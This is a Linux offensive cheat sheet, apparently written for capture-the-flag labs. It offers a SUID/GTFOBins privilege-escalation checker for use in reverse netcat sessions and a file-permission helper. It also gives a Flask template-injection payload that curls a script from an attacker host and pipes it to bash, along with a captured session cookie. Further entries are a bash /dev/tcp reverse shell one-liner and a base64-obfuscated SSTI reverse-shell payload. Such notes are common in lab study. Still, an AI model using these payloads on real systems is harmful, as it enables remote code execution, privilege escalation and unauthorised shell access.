# Useful Linux Tricks

## SUID check function that checks for known GTFO bin executables on the machine

> This is usable in reverse netcat sessions (copy + paste the code below in)
> Credits: Robot
```sh
suidcheck() {
    # List of known GTFO bins
    gtfobins_list=("aa-exec" "ab" "agetty" "alpine" "ar" "arj" "arp" "as" "ascii-xfr" "ash" "aspell" "atobm" "awk" "base32" "base64" "basenc" "basez" "bash" "bc" "bridge" "busybox" "bzip2" "cabal" "capsh" "cat" "chmod" "choom" "chown" "chroot" "clamscan" "cmp" "column" "comm" "cp" "cpio" "cpulimit" "csh" "csplit" "csvtool" "cupsfilter" "curl" "cut" "dash" "date" "dd" "debugfs" "dialog" "diff" "dig" "distcc" "dmsetup" "docker" "dosbox" "ed" "efax" "elvish" "emacs" "env" "eqn" "espeak" "expand" "expect" "file" "find" "fish" "flock" "fmt" "fold" "gawk" "gcore" "gdb" "genie" "genisoimage" "gimp" "grep" "gtester" "gzip" "hd" "head" "hexdump" "highlight" "hping3" "iconv" "install" "ionice" "ip" "ispell" "jjs" "join" "jq" "jrunscript" "julia" "ksh" "ksshell" "kubectl" "ld.so" "less" "logsave" "look" "lua" "make" "mawk" "more" "mosquitto" "msgattrib" "msgcat" "msgconv" "msgfilter" "msgmerge" "msguniq" "multitime" "mv" "nasm" "nawk" "ncftp" "nft" "nice" "nl" "nm" "nmap" "node" "nohup" "od" "openssl" "openvpn" "pandoc" "paste" "perf" "perl" "pexec" "pg" "php" "pidstat" "pr" "ptx" "python" "rc" "readelf" "restic" "rev" "rlwrap" "rsync" "rtorrent" "run-parts" "rview" "rvim" "sash" "scanmem" "sed" "setarch" "setfacl" "setlock" "shuf" "soelim" "softlimit" "sort" "sqlite3" "ss" "ssh-agent" "ssh-keygen" "ssh-keyscan" "sshpass" "start-stop-daemon" "stdbuf" "strace" "strings" "sysctl" "systemctl" "tac" "tail" "taskset" "tbl" "tclsh" "tee" "terraform" "tftp" "tic" "time" "timeout" "troff" "ul" "unexpand" "uniq" "unshare" "unsquashfs" "unzip" "update-alternatives" "uudecode" "uuencode" "vagrant" "view" "vigr" "vim" "vimdiff" "vipw" "w3m" "watch" "wc" "wget" "whiptail" "xargs" "xdotool" "xmodmap" "xmore" "xxd" "xz" "yash" "zsh" "zsoelim")

    # Check if any SUID binaries exist that match the list
    found_flag=0
    find / -perm -u=s -type f 2>/dev/null -exec basename {} \; | while read -r binary; do
        if printf '%s\n' "${gtfobins_list[@]}" | grep -q -w "$binary"; then
            echo "Vulnerable SUID binary found: $binary"
            found_flag=1
        fi
    done

    if [ $found_flag -eq 0 ]; then
        echo "No SUID Priv Esc Found"
    fi
}

suidcheck
```

## Permission check function that neatly prints out the permission information for any file/directory
> You can add this to your .bashrc or .zshrc file as a custom function if you want to use it any time you start up your terminal
> Credits: Robot
```sh
permissioncheck () {
  filename="$1"
  fullpath=$(realpath "$filename")
  dirname=$(dirname "$fullpath")

  echo "=================================="
  echo "Filename:  $filename in $dirname"

  ls -ld "$filename" | awk '{print $1, $3, $4}' | awk -v user=$(whoami) -v group=$(id -gn) '
  function format_permission(symbol, permission) {
    if (symbol == "-") {
      return permission " (No)";
    } else {
      return permission " (OK)";
    }
  }

  BEGIN {
    type_trans["-"] = "Regular File";
    type_trans["d"] = "Directory";
    type_trans["l"] = "Symbolic Link";
  }

  {
    own = ($2 == user) ? "Yes" : "No";
    grp = ($3 == group) ? "Yes" : "No";
    
    printf "Owner: %s (You are owner: %s)\nGroup: %s (You are in group: %s)\nType: %s\nUser: %s | %s | %s\nGroup: %s | %s | %s\nOthers: %s | %s | %s\n", 
    $2, own, $3, grp, type_trans[substr($1, 1, 1)], 
    format_permission(substr($1, 2, 1), "Read"), format_permission(substr($1, 3, 1), "Write"), format_permission(substr($1, 4, 1), "Execute"), 
    format_permission(substr($1, 5, 1), "Read"), format_permission(substr($1, 6, 1), "Write"), format_permission(substr($1, 7, 1), "Execute"), 
    format_permission(substr($1, 8, 1), "Read"), format_permission(substr($1, 9, 1), "Write"), format_permission(substr($1, 10, 1), "Execute")
  }'

  echo "=================================="
}
```

## Two part curl command to keep persistent reverse shell open
Example of a two part curl command for a flask app designed to start a persistent reverse shell (we'd get a response on our netcat listener but it would close upon page load after a single command was entered)
```bash
curl 'http://10.10.251.0:7777/debug?debug=\{\{+self.__init__.__globals__.__builtins__.__import__("os").popen("curl+10.13.4.142:5555/getme.sh+|+bash").read()+\}\}&password=userpassword' -I
```

```bash
curl 'http://10.10.251.0:7777/debugresult' -H 'X-Forwarded-For: 127.0.0.1' -b session='.eJxdjuEKgjAUhV9lXAgVYrm0CJ9lMDa96WC5sasUmO_eVv-6Pw7fB-fA3WBAs47QwbYxQnfnStnZLkolGJ032tGXzWrdYuef2EfwMXVKCZ4kVDz4gHOyfo2OiZqLhrdctOfuku404vJAThN7M6NpyoOIeigrtu9whKCJnj4O6QlTMClfdf0Xh5SilzJma7LcMl0zYQH7B9oKQHY.ZRFlMQ.9D9Uc9JsO7arJU8fgQ1LJnBKu1E'
```

## Useful Linux One Liners

### ls -la
- List all files in current directory with long listing (shows rwx perms and ownership)
### id
- Shows real and effective group ids for current user
### sudo -l
- Shows all sudo permissions (useless if you don't have access to password for the user or the user can't use sudo)
### ps aux | grep root
- Shows running processes being run by root
### find / -name/-group "name"
- Find files with name or owned by group
### grep -rah "text"
- Greps a directory for a certain text string

### grep -r --include=*.html --include=*.php --include=*.htm "pattern" /some/path/

### find /some/path/ -name "*.htm*" -or -name "*.php" | xargs grep "pattern"

### Finds suid binaries that you have permission to access
find / -perm -u=s -type f 2>/dev/null

### Useful for using python3 to edit text files
cat /usr/share/seclists/Discovery/Web-Content/common.txt | python3 -c "import sys; [print(i.strip() + '.py') for i in sys.stdin]" > py_wordlist.txt

### Useful for terminal issues
stty sane
rlwrap nc -lvnp $PORT

### Bash reverse shell command
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

### Flask payload using a base64 SSH key (with the payload in the key's name field)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42NC80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}
